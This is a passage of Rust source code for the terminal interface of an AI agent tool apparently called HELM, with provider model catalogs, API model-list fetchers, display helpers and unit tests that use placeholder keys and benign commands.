                .and_then(|value| value.get("redirect_stdout_to"))
                .and_then(serde_json::Value::as_str)
            {
                format!(
                    "{mode} `{}` -> {}",
                    truncate(command, 96),
                    truncate(path, 72)
                )
            } else {
                format!("{mode} `{}`", truncate(command, 120))
            }
        }
        "fs_read" => object
            .and_then(|value| value.get("path"))
            .and_then(serde_json::Value::as_str)
            .map(|path| format!("read {}", truncate(path, 120)))
            .unwrap_or_else(|| truncate(compact_json(input), 140)),
        "fs_write" => {
            let path = object
                .and_then(|value| value.get("path"))
                .and_then(serde_json::Value::as_str)
                .unwrap_or("path");
            let mode = object
                .and_then(|value| value.get("mode"))
                .and_then(serde_json::Value::as_str)
                .unwrap_or("create_only");
            format!("{mode} {}", truncate(path, 120))
        }
        "browser" => {
            let action = object
                .and_then(|value| value.get("action"))
                .and_then(serde_json::Value::as_str)
                .unwrap_or("action");
            let target = object
                .and_then(|value| value.get("url").or_else(|| value.get("ref")))
                .and_then(serde_json::Value::as_str);
            target
                .map(|target| format!("{action} {}", truncate(target, 120)))
                .unwrap_or_else(|| action.to_owned())
        }
        "service" | "package" | "process" | "disk" | "network" | "logs" => object
            .and_then(|value| value.get("action"))
            .and_then(serde_json::Value::as_str)
            .map(|action| format!("{action} {}", truncate(compact_json(input), 120)))
            .unwrap_or_else(|| truncate(compact_json(input), 140)),
        _ => truncate(compact_json(input), 140),
    }
}

fn transcript_scroll_offsets(
    total_lines: usize,
    viewport_height: u16,
    scroll_from_bottom: usize,
) -> (usize, usize, usize) {
    let max_scroll = total_lines.saturating_sub(viewport_height as usize);
    let scroll_from_bottom = scroll_from_bottom.min(max_scroll);
    let top_offset = max_scroll.saturating_sub(scroll_from_bottom);
    (top_offset, scroll_from_bottom, max_scroll)
}

fn input_height(input: &str, width: u16) -> u16 {
    let usable = width.saturating_sub(4).max(20) as usize;
    let wrapped_lines: usize = input
        .lines()
        .map(|line| line.chars().count().max(1).div_ceil(usable))
        .sum::<usize>()
        .max(1);
    (wrapped_lines as u16 + 2).clamp(3, 7)
}

fn centered_rect(percent_x: u16, percent_y: u16, area: Rect) -> Rect {
    let popup_layout = Layout::default()
        .direction(Direction::Vertical)
        .constraints([
            Constraint::Percentage((100 - percent_y) / 2),
            Constraint::Percentage(percent_y),
            Constraint::Percentage((100 - percent_y) / 2),
        ])
        .split(area);
    Layout::default()
        .direction(Direction::Horizontal)
        .constraints([
            Constraint::Percentage((100 - percent_x) / 2),
            Constraint::Percentage(percent_x),
            Constraint::Percentage((100 - percent_x) / 2),
        ])
        .split(popup_layout[1])[1]
}

fn char_to_byte(s: &str, char_idx: usize) -> usize {
    s.char_indices()
        .nth(char_idx)
        .map(|(byte, _)| byte)
        .unwrap_or(s.len())
}

fn truncate(text: impl AsRef<str>, max_chars: usize) -> String {
    let text = text.as_ref();
    let mut chars = text.chars();
    let truncated: String = chars.by_ref().take(max_chars).collect();
    if chars.next().is_some() {
        format!("{truncated}...")
    } else {
        truncated
    }
}

#[cfg(test)]
fn compact_json(value: &serde_json::Value) -> String {
    serde_json::to_string(value).unwrap_or_else(|error| format!("invalid json: {error}"))
}

fn sanitize_display_text(text: &str) -> String {
    text.chars()
        .map(|ch| {
            if ch == '\n' || ch == '\t' || !ch.is_control() {
                ch
            } else {
                ' '
            }
        })
        .collect()
}

fn sanitize_one_line(text: &str) -> String {
    sanitize_display_text(text)
        .lines()
        .collect::<Vec<_>>()
        .join(" ")
}

fn format_duration(d: Duration) -> String {
    let secs = d.as_secs();
    if secs < 60 {
        format!("{secs}s")
    } else if secs < 3600 {
        format!("{}m{}s", secs / 60, secs % 60)
    } else {
        format!("{}h{}m", secs / 3600, (secs % 3600) / 60)
    }
}

fn provider_selector_list() -> Vec<(ProviderChoice, Option<&'static str>)> {
    vec![
        (ProviderChoice::Groq, Some("GROQ_API_KEY")),
        (ProviderChoice::Anthropic, Some("ANTHROPIC_API_KEY")),
        (ProviderChoice::Openrouter, Some("OPENROUTER_API_KEY")),
        (ProviderChoice::Gemini, Some("GOOGLE_API_KEY")),
        (ProviderChoice::NvidiaNim, Some("NVIDIA_API_KEY")),
        (ProviderChoice::OpenaiCompat, Some("OPENAI_API_KEY")),
        (ProviderChoice::Ollama, None),
    ]
}

fn catalog_entry(
    group: &str,
    label: &str,
    provider: ProviderChoice,
    model: &str,
    note: Option<&str>,
) -> ModelCatalogEntry {
    ModelCatalogEntry {
        group: group.to_owned(),
        label: label.to_owned(),
        provider,
        model: model.to_owned(),
        note: note.map(str::to_owned),
    }
}

fn static_model_catalog_for(choice: ProviderChoice) -> Vec<ModelCatalogEntry> {
    match choice {
        ProviderChoice::Groq => vec![
            catalog_entry(
                "Groq",
                "Llama 3.3 70B Versatile",
                choice,
                "llama-3.3-70b-versatile",
                Some("default"),
            ),
            catalog_entry(
                "Groq",
                "Llama 3.1 8B Instant",
                choice,
                "llama-3.1-8b-instant",
                Some("fast"),
            ),
            catalog_entry("Groq", "GPT OSS 120B", choice, "openai/gpt-oss-120b", None),
            catalog_entry("Groq", "GPT OSS 20B", choice, "openai/gpt-oss-20b", None),
        ],
        ProviderChoice::Anthropic => vec![
            catalog_entry(
                "Anthropic",
                "Claude Opus 4.1",
                choice,
                "claude-opus-4-1-20250805",
                Some("default"),
            ),
            catalog_entry(
                "Anthropic",
                "Claude 3.5 Haiku",
                choice,
                "claude-3-5-haiku-20241022",
                Some("fast"),
            ),
        ],
        ProviderChoice::Ollama => vec![catalog_entry(
            "Ollama",
            "Qwen3 4B",
            choice,
            "qwen3:4b",
            Some("local"),
        )],
        ProviderChoice::Gemini => vec![
            catalog_entry(
                "Google",
                "Gemini 2.5 Flash",
                choice,
                "gemini-2.5-flash",
                Some("default"),
            ),
            catalog_entry(
                "Google",
                "Gemini 2.5 Flash Lite",
                choice,
                "gemini-2.5-flash-lite",
                Some("fast"),
            ),
            catalog_entry("Google", "Gemini 2.5 Pro", choice, "gemini-2.5-pro", None),
            catalog_entry(
                "Google",
                "Gemini 2.0 Flash",
                choice,
                "gemini-2.0-flash",
                None,
            ),
        ],
        ProviderChoice::Openrouter => vec![
            catalog_entry(
                "OpenRouter",
                "Kimi K2.6",
                choice,
                "moonshotai/kimi-k2.6",
                None,
            ),
            catalog_entry(
                "OpenRouter",
                "DeepSeek Chat",
                choice,
                "deepseek/deepseek-chat",
                Some("free"),
            ),
            catalog_entry(
                "OpenRouter",
                "DeepSeek Reasoner",
                choice,
                "deepseek/deepseek-r1",
                Some("free"),
            ),
            catalog_entry(
                "OpenRouter",
                "Qwen 3 Coder",
                choice,
                "qwen/qwen3-coder",
                None,
            ),
        ],
        ProviderChoice::NvidiaNim => vec![
            catalog_entry("NVIDIA", "Kimi K2.6", choice, "moonshotai/kimi-k2.6", None),
            catalog_entry("NVIDIA", "GLM 5.1", choice, "z-ai/glm-5.1", None),
            catalog_entry(
                "NVIDIA",
                "DeepSeek V4 Pro",
                choice,
                "deepseek-ai/deepseek-v4-pro",
                None,
            ),
            catalog_entry(
                "NVIDIA",
                "Nemotron 3 Super 120B",
                choice,
                "nvidia/nemotron-3-super-120b",
                None,
            ),
        ],
        ProviderChoice::OpenaiCompat => vec![catalog_entry(
            "OpenAI-Compatible",
            "GPT-4o Mini",
            choice,
            "gpt-4o-mini",
            Some("default"),
        )],
        ProviderChoice::Auto => Vec::new(),
    }
}

fn filtered_model_catalog(entries: &[ModelCatalogEntry], query: &str) -> Vec<ModelCatalogEntry> {
    let query = query.trim().to_ascii_lowercase();
    entries
        .iter()
        .filter(|entry| {
            query.is_empty()
                || entry.label.to_ascii_lowercase().contains(&query)
                || entry.model.to_ascii_lowercase().contains(&query)
                || entry.group.to_ascii_lowercase().contains(&query)
                || provider_choice_name(entry.provider)
                    .to_ascii_lowercase()
                    .contains(&query)
        })
        .cloned()
        .collect()
}

fn live_catalog_group(choice: ProviderChoice) -> &'static str {
    match choice {
        ProviderChoice::Groq => "Groq",
        ProviderChoice::Anthropic => "Anthropic",
        ProviderChoice::Ollama => "Ollama",
        ProviderChoice::Gemini => "Google",
        ProviderChoice::Openrouter => "OpenRouter",
        ProviderChoice::NvidiaNim => "NVIDIA",
        ProviderChoice::OpenaiCompat => "OpenAI-Compatible",
        ProviderChoice::Auto => "Auto",
    }
}

fn base_url_for_provider(choice: ProviderChoice, settings: &ProviderSettings) -> String {
    match choice {
        ProviderChoice::Groq => "https://api.groq.com/openai/v1".to_owned(),
        ProviderChoice::Anthropic => "https://api.anthropic.com".to_owned(),
        ProviderChoice::Ollama => settings
            .base_url
            .clone()
            .unwrap_or_else(|| "http://localhost:11434".to_owned()),
        ProviderChoice::Gemini => settings
            .base_url
            .clone()
            .unwrap_or_else(|| "https://generativelanguage.googleapis.com".to_owned()),
        ProviderChoice::Openrouter => "https://openrouter.ai/api/v1".to_owned(),
        ProviderChoice::NvidiaNim => "https://integrate.api.nvidia.com/v1".to_owned(),
        ProviderChoice::OpenaiCompat => settings
            .base_url
            .clone()
            .unwrap_or_else(|| "https://api.openai.com/v1".to_owned()),
        ProviderChoice::Auto => settings
            .base_url
            .clone()
            .unwrap_or_else(|| "http://localhost:11434".to_owned()),
    }
}

fn model_note_for(choice: ProviderChoice, model: &str, live: bool) -> Option<String> {
    if model == default_model_name(choice) {
        Some("default".to_owned())
    } else if choice == ProviderChoice::Ollama && model.ends_with(":cloud") {
        Some("cloud".to_owned())
    } else if choice == ProviderChoice::Ollama {
        Some("local".to_owned())
    } else if live {
        Some("live".to_owned())
    } else {
        None
    }
}

async fn fetch_model_catalog_for_provider(
    choice: ProviderChoice,
    settings: &ProviderSettings,
    resolved_key: Option<String>,
) -> Result<Vec<ModelCatalogEntry>> {
    let base_url = base_url_for_provider(choice, settings);
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(4))
        .build()
        .context("building model catalog client")?;
    let models = match choice {
        ProviderChoice::Ollama => fetch_ollama_catalog(&client, &base_url).await?,
        ProviderChoice::Gemini => {
            let key = resolved_key.ok_or_else(|| anyhow!("missing Gemini API key"))?;
            fetch_gemini_catalog(&client, &base_url, &key).await?
        }
        ProviderChoice::Anthropic => {
            let key = resolved_key.ok_or_else(|| anyhow!("missing Anthropic API key"))?;
            fetch_anthropic_catalog(&client, &base_url, &key).await?
        }
        ProviderChoice::Groq
        | ProviderChoice::Openrouter
        | ProviderChoice::NvidiaNim
        | ProviderChoice::OpenaiCompat => {
            fetch_openai_style_catalog(&client, choice, &base_url, resolved_key.as_deref()).await?
        }
        ProviderChoice::Auto => Vec::new(),
    };

    if models.is_empty() {
        return Ok(static_model_catalog_for(choice));
    }

    Ok(models)
}

#[derive(Debug, Deserialize)]
struct OpenAiModelsResponse {
    #[serde(default)]
    data: Vec<OpenAiModelRecord>,
}

#[derive(Debug, Deserialize)]
struct OpenAiModelRecord {
    id: String,
}

async fn fetch_openai_style_catalog(
    client: &reqwest::Client,
    choice: ProviderChoice,
    base_url: &str,
    api_key: Option<&str>,
) -> Result<Vec<ModelCatalogEntry>> {
    let url = format!("{}/models", base_url.trim_end_matches('/'));
    let mut request = client.get(url);
    if let Some(key) = api_key
        && !key.trim().is_empty()
    {
        request = request.bearer_auth(key);
    }
    if choice == ProviderChoice::Openrouter {
        request = request
            .header("HTTP-Referer", "https://github.com/Jatin-Mali/helm")
            .header("X-Title", "HELM");
    }
    let response = request.send().await?.error_for_status()?;
    let parsed: OpenAiModelsResponse = response.json().await?;
    let group = live_catalog_group(choice);
    let mut entries = parsed
        .data
        .into_iter()
        .map(|record| {
            let note = model_note_for(choice, &record.id, true);
            ModelCatalogEntry {
                group: group.to_owned(),
                label: record.id.clone(),
                provider: choice,
                model: record.id,
                note,
            }
        })
        .collect::<Vec<_>>();
    entries.sort_by(|left, right| left.label.cmp(&right.label));
    Ok(entries)
}

#[derive(Debug, Deserialize)]
struct OllamaTagsResponse {
    #[serde(default)]
    models: Vec<OllamaTagRecord>,
}

#[derive(Debug, Deserialize)]
struct OllamaTagRecord {
    name: String,
}

async fn fetch_ollama_catalog(
    client: &reqwest::Client,
    base_url: &str,
) -> Result<Vec<ModelCatalogEntry>> {
    let url = format!("{}/api/tags", base_url.trim_end_matches('/'));
    let response = client.get(url).send().await?.error_for_status()?;
    let parsed: OllamaTagsResponse = response.json().await?;
    let mut entries = parsed
        .models
        .into_iter()
        .map(|record| ModelCatalogEntry {
            group: "Ollama".to_owned(),
            label: record.name.clone(),
            provider: ProviderChoice::Ollama,
            model: record.name.clone(),
            note: model_note_for(ProviderChoice::Ollama, &record.name, true),
        })
        .collect::<Vec<_>>();
    entries.sort_by(|left, right| left.label.cmp(&right.label));
    Ok(entries)
}

#[derive(Debug, Deserialize)]
struct GeminiModelsResponse {
    #[serde(default)]
    models: Vec<GeminiModelRecord>,
}

#[derive(Debug, Deserialize)]
struct GeminiModelRecord {
    name: String,
    #[serde(rename = "displayName")]
    display_name: Option<String>,
    #[serde(rename = "supportedGenerationMethods")]
    supported_generation_methods: Option<Vec<String>>,
}

async fn fetch_gemini_catalog(
    client: &reqwest::Client,
    base_url: &str,
    api_key: &str,
) -> Result<Vec<ModelCatalogEntry>> {
    let url = format!(
        "{}/v1beta/models?key={api_key}",
        base_url.trim_end_matches('/')
    );
    let response = client.get(url).send().await?.error_for_status()?;
    let parsed: GeminiModelsResponse = response.json().await?;
    let mut entries = parsed
        .models
        .into_iter()
        .filter(|record| {
            record
                .supported_generation_methods
                .as_ref()
                .is_none_or(|methods| methods.iter().any(|method| method == "generateContent"))
        })
        .map(|record| {
            let model_id = record.name.trim_start_matches("models/").to_owned();
            ModelCatalogEntry {
                group: "Google".to_owned(),
                label: record.display_name.unwrap_or_else(|| model_id.clone()),
                provider: ProviderChoice::Gemini,
                note: model_note_for(ProviderChoice::Gemini, &model_id, true),
                model: model_id,
            }
        })
        .collect::<Vec<_>>();
    entries.sort_by(|left, right| left.label.cmp(&right.label));
    Ok(entries)
}

#[derive(Debug, Deserialize)]
struct AnthropicModelsResponse {
    #[serde(default)]
    data: Vec<AnthropicModelRecord>,
}

#[derive(Debug, Deserialize)]
struct AnthropicModelRecord {
    id: String,
    #[serde(default)]
    display_name: Option<String>,
}

async fn fetch_anthropic_catalog(
    client: &reqwest::Client,
    base_url: &str,
    api_key: &str,
) -> Result<Vec<ModelCatalogEntry>> {
    let url = format!("{}/v1/models", base_url.trim_end_matches('/'));
    let response = client
        .get(url)
        .header("x-api-key", api_key)
        .header("anthropic-version", "2023-06-01")
        .send()
        .await?
        .error_for_status()?;
    let parsed: AnthropicModelsResponse = response.json().await?;
    let mut entries = parsed
        .data
        .into_iter()
        .map(|record| ModelCatalogEntry {
            group: "Anthropic".to_owned(),
            label: record.display_name.unwrap_or_else(|| record.id.clone()),
            provider: ProviderChoice::Anthropic,
            note: model_note_for(ProviderChoice::Anthropic, &record.id, true),
            model: record.id,
        })
        .collect::<Vec<_>>();
    entries.sort_by(|left, right| left.label.cmp(&right.label));
    Ok(entries)
}

fn is_auth_error(error: &str) -> bool {
    error.contains("HTTP 401")
        || error.contains("invalid_api_key")
        || error.contains("Invalid API Key")
        || error.contains("Unauthorized")
        || error.contains("authentication_error")
}

fn friendly_error(error: &str) -> String {
    if error.contains("HTTP 401")
        || error.contains("invalid_api_key")
        || error.contains("Invalid API Key")
    {
        "Invalid API key. Set the provider's env key (e.g. GROQ_API_KEY) and press Ctrl+P → Provider to switch, or run `helm init --force`.".to_owned()
    } else if error.contains("HTTP 429") || error.contains("rate_limit") {
        "Rate limited. Wait for the provider reset, switch model (Ctrl+P → Model), or switch provider (Ctrl+P → Provider).".to_owned()
    } else if error.contains("model") && error.contains("not found") {
        "Model not found. For Ollama run `ollama pull qwen3:4b`. Use Ctrl+P → Model to change model.".to_owned()
    } else if error.contains("HTTP 400")
        || error.contains("tool_use")
        || error.contains("tool name")
    {
        "Provider rejected a tool call (HTTP 400). The model may not support tool use. Switch to a different model (Ctrl+P → Model) or provider (Ctrl+P → Provider).".to_owned()
    } else {
        error.to_owned()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use ratatui::backend::TestBackend;
    use std::sync::{Mutex, OnceLock};

    type AuditRow = (
        String,
        String,
        String,
        String,
        String,
        String,
        String,
        String,
    );

    fn app_in_dir(dir: &tempfile::TempDir, choice: crate::ProviderChoice) -> TuiApp {
        let db = dir.path().join("helm.db");
        let memory = Arc::new(
            tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
                .unwrap()
                .block_on(MemoryStore::open(&db))
                .unwrap(),
        );
        let secrets = SecretsStore::open_at(dir.path().join("secrets.toml")).unwrap();
        TuiApp::new(TuiRuntime {
            provider_settings: ProviderSettings {
                choice,
                base_url: if choice == crate::ProviderChoice::Ollama {
                    Some("http://localhost:11434".to_owned())
                } else {
                    Some("https://api.example.com/v1".to_owned())
                },
                model: Some(
                    match choice {
                        crate::ProviderChoice::Groq => "llama-3.3-70b-versatile",
                        _ => "qwen3:4b",
                    }
                    .to_owned(),
                ),
                api_key_env: default_api_key_env(choice).map(str::to_owned),
                api_key: None,
                source: if choice == crate::ProviderChoice::Ollama {
                    crate::ProviderSource::Fallback
                } else {
                    crate::ProviderSource::Cli
                },
            },
            db_path: db,
            config_path: dir.path().join("config.toml"),
            memory,
            max_iterations: Some(2),
            secrets,
            tui_paste_key_modal: true,
            auto_approve: false,
            read_only: false,
            diagnose_mode: false,
            dashboard_mode: false,
            sandbox: None,
            remote_target: None,
        })
    }

    fn app() -> TuiApp {
        let dir = tempfile::tempdir().unwrap();
        app_in_dir(&dir, crate::ProviderChoice::Ollama)
    }

    fn env_lock() -> &'static Mutex<()> {
        static LOCK: OnceLock<Mutex<()>> = OnceLock::new();
        LOCK.get_or_init(|| Mutex::new(()))
    }

    fn test_catalog() -> Vec<ModelCatalogEntry> {
        let mut entries = Vec::new();
        for choice in [
            ProviderChoice::Groq,
            ProviderChoice::Gemini,
            ProviderChoice::NvidiaNim,
        ] {
            entries.extend(static_model_catalog_for(choice));
        }
        entries
    }

    fn render_to_buffer(mut app: TuiApp, width: u16, height: u16) -> Buffer {
        app.push_chat(MessageRole::User, "hello from user");
        app.push_chat(
            MessageRole::Assistant,
            "this is a very long assistant output that should wrap cleanly inside the transcript without overflowing into the input panel",
        );
        app.record_tool_event("start", "shell", "echo hello");
        let backend = TestBackend::new(width, height);
        let mut terminal = Terminal::new(backend).unwrap();
        terminal.draw(|frame| app.render(frame)).unwrap();
        terminal.backend().buffer().clone()
    }

    #[test]
    fn renders_at_normal_size() {
        let buffer = render_to_buffer(app(), 80, 24);
        assert_eq!(buffer.area.width, 80);
        assert_eq!(buffer.area.height, 24);
    }

    #[test]
    fn renders_at_wide_size() {
        let buffer = render_to_buffer(app(), 120, 40);
        assert_eq!(buffer.area.width, 120);
        assert!(buffer.content().iter().any(|cell| cell.symbol() == "H"));
    }

    #[test]
    fn renders_at_small_size() {
        let buffer = render_to_buffer(app(), 40, 15);
        assert_eq!(buffer.area.width, 40);
        assert_eq!(buffer.area.height, 15);
    }

    #[test]
    fn input_height_grows_and_clamps() {
        assert_eq!(input_height("short", 80), 3);
        assert_eq!(input_height(&"x".repeat(1_000), 80), 7);
    }

    #[test]
    fn command_palette_filters_commands() {
        let mut app = app();
        app.command_palette.query = "doctor".to_owned();
        let filtered = app.filtered_palette_items();
        assert_eq!(filtered, vec![PaletteItem::BuiltIn(CommandAction::Doctor)]);
    }

    #[test]
    fn command_palette_includes_custom_commands() {
        let mut app = app();
        app.custom_commands.push(custom_commands::CustomCommand {
            name: "triage".to_owned(),
            description: "Quick incident triage helper".to_owned(),
            body: "Investigate alerts for {{args}}".to_owned(),
        });
        app.command_palette.query = "triage".to_owned();

        let filtered = app.filtered_palette_items();

        assert_eq!(
            filtered,
            vec![PaletteItem::Custom(custom_commands::CustomCommand {
                name: "triage".to_owned(),
                description: "Quick incident triage helper".to_owned(),
                body: "Investigate alerts for {{args}}".to_owned(),
            })]
        );
    }

    #[test]
    fn slash_popup_includes_custom_commands() {
        let mut app = app();
        app.custom_commands.push(custom_commands::CustomCommand {
            name: "triage".to_owned(),
            description: "Quick incident triage helper".to_owned(),
            body: "Investigate alerts for {{args}}".to_owned(),
        });
        app.input.text = "/tri".to_owned();

        let filtered = app.slash_filtered();

        assert!(matches!(
            filtered.first(),
            Some(SlashItem::Custom(command)) if command.name == "triage"
        ));
    }

    #[test]
    fn modal_overlays_buffer() {
        let mut app = app();
        app.modal = Some(ModalState::Help);
        let buffer = render_to_buffer(app, 80, 24);
        let text = buffer
            .content()
            .iter()
            .map(|cell| cell.symbol())
            .collect::<String>();
        assert!(text.contains("Help"));
    }

    #[test]
    fn input_state_supports_multiline_and_history() {
        let mut input = InputState::new();
        input.insert('h');
        input.insert_newline();
        input.insert('i');
        assert_eq!(input.text, "h\ni");
        assert_eq!(input.take_submit(), Some("h\ni".to_owned()));
        input.previous_history();
        assert_eq!(input.text, "h\ni");
    }

    #[test]
    fn friendly_errors_are_actionable() {
        assert!(friendly_error("provider returned HTTP 401").contains("Invalid API key"));
        assert!(friendly_error("provider returned HTTP 429").contains("Rate limited"));
    }

    #[test]
    fn auth_modal_escape_dismisses_cleanly() {
        let mut app = app();
        app.pending_auth_retry = Some("retry me".to_owned());
        app.modal = Some(ModalState::AuthRequired {
            provider_name: "groq".to_owned(),
            env_name: "GROQ_API_KEY".to_owned(),
            input: String::new(),
            error: None,
        });
        let (tx, _rx) = mpsc::unbounded_channel();

        tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap()
            .block_on(app.handle_modal_key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE), tx))
            .unwrap();

        assert!(app.modal.is_none());
        assert!(app.pending_auth_retry.is_none());
    }

    #[test]
    fn auth_modal_never_renders_raw_key() {
        let mut app = app();
        app.modal = Some(ModalState::AuthRequired {
            provider_name: "groq".to_owned(),
            env_name: "GROQ_API_KEY".to_owned(),
            input: "SECRET_KEY_VALUE".to_owned(),
            error: None,
        });

        let buffer = render_to_buffer(app, 80, 24);
        let text = buffer
            .content()
            .iter()
            .map(|cell| cell.symbol())
            .collect::<String>();

        assert!(!text.contains("SECRET_KEY_VALUE"));
        assert!(text.contains("••••"));
    }

    #[test]
    fn tool_event_sanitizes_multiline_and_control_text() {
        let mut app = app();
        app.record_tool_event("ok\nbad", "shell\u{0007}", "line 1\nline 2");
        let item = app.session.chat.last().unwrap();
        assert_eq!(item.role, MessageRole::Activity);
        assert_eq!(item.text, "ok bad shell  — line 1 line 2");
    }

    #[test]
    fn routine_provider_events_stay_out_of_transcript() {
        let mut app = app();
        app.record_tool_event("queued", "agent", "task submitted");
        app.record_tool_event("run", "episode", "abc");
        app.record_tool_event("call", "groq", "iteration 0");
        app.record_tool_event("done", "provider", "1 EndTurn, 1539/342 tokens");
        app.record_tool_event("done", "episode", "1 iter(s), 1539 in / 342 out tokens");

        assert!(app.session.chat.is_empty());
        assert_eq!(app.status_note, "ready");
    }

    #[test]
    fn visible_tool_events_are_concise_activity_lines() {
        let mut app = app();
        app.record_tool_event("start", "shell", r#"{"command":"du -sh /home"}"#);
        app.record_tool_event("err", "shell", "tool timed out after a very long command");

        assert_eq!(app.session.chat.len(), 2);
        assert_eq!(app.session.chat[0].role, MessageRole::Activity);
        assert_eq!(app.session.chat[0].text, "running shell");
        assert!(app.session.chat[1].text.contains("shell failed"));
    }

    #[test]
    fn tool_call_summary_prefers_human_readable_fields() {
        assert_eq!(
            tool_call_summary(
                "browser",
                &serde_json::json!({"action": "open", "url": "https://example.com"})
            ),
            "open https://example.com"
        );
        assert_eq!(
            tool_call_summary(
                "fs_write",
                &serde_json::json!({"path": "/tmp/a", "mode": "append"})
            ),
            "append /tmp/a"
        );
    }

    #[test]
    fn model_catalog_filters_across_providers() {
        let catalog = test_catalog();
        let models = filtered_model_catalog(&catalog, "gemini 2.5 flash");
        assert!(models.iter().any(|entry| {
            entry.provider == ProviderChoice::Gemini && entry.model == "gemini-2.5-flash"
        }));

        let models = filtered_model_catalog(&catalog, "kimi");
        assert!(models.iter().any(|entry| {
            entry.provider == ProviderChoice::NvidiaNim && entry.model == "moonshotai/kimi-k2.6"
        }));
    }

    #[test]
    fn applying_catalog_model_switches_provider_and_model() {
        let mut app = app();
        let catalog = test_catalog();
        let entry = filtered_model_catalog(&catalog, "deepseek v4")
            .into_iter()
            .find(|entry| entry.provider == ProviderChoice::NvidiaNim)
            .unwrap();

        app.apply_model_entry(entry);

        assert_eq!(app.active_settings.choice, ProviderChoice::NvidiaNim);
        assert_eq!(
            app.active_settings.model,
            Some("deepseek-ai/deepseek-v4-pro".to_owned())
        );
        assert_eq!(app.provider_name, "nvidia-nim");
    }

    #[test]
    fn provider_selector_reads_secret_store_status() {
        let dir = tempfile::tempdir().unwrap();
        let app = app_in_dir(&dir, crate::ProviderChoice::Ollama);
        app.runtime
            .secrets
            .set(
                "GROQ_API_KEY",
                helm_core::Secret::new("gsk_abcdefghijklmnopqrstuvwxyz123456".to_owned()),
            )
            .unwrap();

        assert_eq!(
            app.provider_key_status(ProviderChoice::Groq),
            ProviderKeyStatus::Stored
        );
    }

    #[test]
    fn provider_selector_reads_session_override_status() {
        let _guard = env_lock().lock().unwrap();
        let dir = tempfile::tempdir().unwrap();
        // SAFETY: guarded by env_lock for this test.
        unsafe {
            std::env::remove_var("GROQ_API_KEY");
        }
        let mut app = app_in_dir(&dir, crate::ProviderChoice::Groq);
        app.active_settings.api_key = Some("gsk_session_key_abcdefghijklmnopqrstuvwxyz".to_owned());

        assert_eq!(
            app.provider_key_status(ProviderChoice::Groq),
            ProviderKeyStatus::Session
        );
    }

    #[test]
    fn remote_command_switches_active_target() {
        let _guard = env_lock().lock().unwrap();
        let dir = tempfile::tempdir().unwrap();
        let home = dir.path().to_path_buf();
        std::fs::create_dir_all(home.join(".config").join("helm")).unwrap();
        std::fs::write(
            home.join(".config").join("helm").join("remotes.toml"),
            "[[remotes]]\nname = \"prod-1\"\nhost = \"prod.example.com\"\nport = 22\n",
        )
        .unwrap();
        // SAFETY: guarded by env_lock for this test.
        unsafe {
            std::env::set_var("HOME", &home);
        }
        let mut app = app_in_dir(&dir, crate::ProviderChoice::Ollama);

        app.apply_remote_target("prod-1");

        assert_eq!(app.active_remote.as_deref(), Some("prod-1"));

        // SAFETY: paired with the guarded set_var above.
        unsafe {
            std::env::remove_var("HOME");
        }
    }

    #[test]
    fn remote_command_can_clear_target() {
        let mut app = app();
        app.active_remote = Some("prod-1".to_owned());

        app.apply_remote_target("off");

        assert!(app.active_remote.is_none());
    }

    #[test]
    fn transcript_scrolls_from_bottom() {
        let (top, from_bottom, max) = transcript_scroll_offsets(20, 5, 0);
        assert_eq!(top, 15);
        assert_eq!(from_bottom, 0);
        assert_eq!(max, 15);

        let (top, from_bottom, max) = transcript_scroll_offsets(20, 5, 5);
        assert_eq!(top, 10);
        assert_eq!(from_bottom, 5);
        assert_eq!(max, 15);

        let (top, from_bottom, max) = transcript_scroll_offsets(20, 5, usize::MAX / 2);
        assert_eq!(top, 0);
        assert_eq!(from_bottom, 15);
        assert_eq!(max, 15);
    }

    #[test]
    fn cancel_running_task_aborts_handle_and_keeps_tui_open() {
        let mut app = app();
        let runtime = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        let _guard = runtime.enter();
        app.running = true;
        app.active_run_id = 10;
        app.agent_task = Some(tokio::spawn(async {
            tokio::time::sleep(Duration::from_secs(60)).await;
        }));

        app.cancel_running_task();

        assert!(!app.running);
        assert!(app.agent_task.is_none());
        assert_eq!(app.active_run_id, 11);
        assert!(app.chat_ends_with(MessageRole::Activity, "task cancelled"));
    }

    #[test]
    fn final_assistant_duplicate_is_detected() {
        let mut app = app();
        app.push_chat(MessageRole::Assistant, "done");
        assert!(app.chat_ends_with(MessageRole::Assistant, "done"));
        assert!(!app.chat_ends_with(MessageRole::Assistant, "other"));
    }

    #[test]
    fn startup_env_key_is_not_persisted_to_secrets_store() {
        let _guard = env_lock().lock().unwrap();
        let dir = tempfile::tempdir().unwrap();
        // SAFETY: this test serializes process-global env mutation with a mutex.
        unsafe {
            std::env::set_var("GROQ_API_KEY", "gsk_abcdefghijklmnopqrstuvwxyz123456");
        }

        let app = app_in_dir(&dir, crate::ProviderChoice::Groq);
        assert_eq!(
            app.active_settings.api_key.as_deref(),
            Some("gsk_abcdefghijklmnopqrstuvwxyz123456")
        );
        assert!(app.runtime.secrets.get("GROQ_API_KEY").unwrap().is_none());

        // SAFETY: paired with the guarded set_var above.
        unsafe {
            std::env::remove_var("GROQ_API_KEY");
        }
    }

    #[test]
    fn manual_provider_key_persists_without_plaintext_config() {
        let dir = tempfile::tempdir().unwrap();
        let mut app = app_in_dir(&dir, crate::ProviderChoice::Groq);

        app.apply_provider_with_key(
            crate::ProviderChoice::Groq,
            "gsk_abcdefghijklmnopqrstuvwxyz123456".to_owned(),
            true,
        );

        let stored = app.runtime.secrets.get("GROQ_API_KEY").unwrap().unwrap();
        assert_eq!(stored.expose(), "gsk_abcdefghijklmnopqrstuvwxyz123456");

        let config = std::fs::read_to_string(dir.path().join("config.toml")).unwrap();
        assert!(config.contains("api_key_env = \"GROQ_API_KEY\""));
        assert!(!config.contains("api_key ="));
        assert!(!config.contains("gsk_abcdefghijklmnopqrstuvwxyz123456"));
    }

    #[test]
    fn live_ollama_catalog_parses_mocked_tags() {
        let runtime = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        let maybe_server = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            runtime.block_on(async { mockito::Server::new_async().await })
        }));
        let Ok(mut server) = maybe_server else {
            eprintln!("skipping mockito-backed catalog test: mock server unavailable");
            return;
        };

        runtime.block_on(async {
            let mock = server
